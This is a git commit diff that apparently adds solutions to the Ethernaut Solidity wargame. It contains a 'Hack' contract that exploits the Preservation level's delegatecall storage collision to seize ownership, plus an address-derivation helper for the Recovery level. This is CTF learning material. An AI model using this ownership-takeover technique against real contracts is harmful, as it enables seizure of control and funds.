050bbc432472c678834fb14497755a9db5943917
465326302 <465326302@qq.com>
2023-02-16 20:56:55 +0800

    结束

--- Ethernaut/Preservation.sol
+++ Ethernaut/Preservation.sol
@@ -1,14 +1,36 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+interface IPreservation {
+    function owner() external view returns (address);
+    function setFirstTime(uint256) external;
+}
+contract Hack {
+    // Align storage layout same as Preservation
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+
+    function attack(IPreservation target) external {
+
+        target.setFirstTime(uint256(uint160(address(this))));
+
+        target.setFirstTime(uint256(uint160(msg.sender)));
+        require(target.owner() == msg.sender, "hack failed");
+    }
+
+    function setTime(uint256 _owner) public {
+        owner = address(uint160(_owner));
+    }
+}
 contract Preservation {
 
-  // public library contracts 
+
   address public timeZone1Library;
   address public timeZone2Library;
   address public owner; 
   uint storedTime;
-  // Sets the function signature for delegatecall
+
   
   bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
 
@@ -18,21 +40,21 @@ contract Preservation {
     owner = msg.sender;
   }
  
-  // set the time for timezone 1
+
   function setFirstTime(uint _timeStamp) public {
     timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
   }
 
-  // set the time for timezone 2
+
   function setSecondTime(uint _timeStamp) public {
     timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
   }
 }
 
-// Simple library contract to set the time
+
 contract LibraryContract {
 
-  // stores a timestamp 
+
   uint storedTime;  
 
   function setTime(uint _time) public {
--- Ethernaut/Recovery.sol
+++ Ethernaut/Recovery.sol
@@ -1,6 +1,19 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
+interface ISimpleToken {
+    function name() external view returns (string memory);
+    function destroy(address to) external;
+}
+
+interface IRecovery {}
+contract Dev {
+    function recover(address sender) external pure returns (address) {
+        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01)));
+        address addr = address(uint160(uint256(hash)));
+        return addr;
+    }
+}
 contract Recovery {
 
   //generate tokens
